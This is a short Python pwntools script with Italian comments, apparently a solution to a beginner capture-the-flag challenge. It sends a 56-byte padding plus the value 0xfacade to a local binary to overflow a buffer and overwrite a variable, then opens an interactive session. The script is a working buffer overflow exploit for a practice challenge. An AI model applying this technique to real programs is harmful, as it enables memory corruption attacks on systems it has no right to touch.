#!/bin/python3
from pwn import *

#Avvio il processo del file binario indicato
p = process("./chall_00")
'''
Se il collegamento è online instauro il collegamento:
p = remote("ctf.endpoint.com",1234)
'''

#gdb.attach(p)
#input()

payload = b"A"*56 +\
            pack(0xfacade,32)# Alternativa Rapida: p32(0xfacade)
print(payload)
p.sendline(payload)
p.interactive()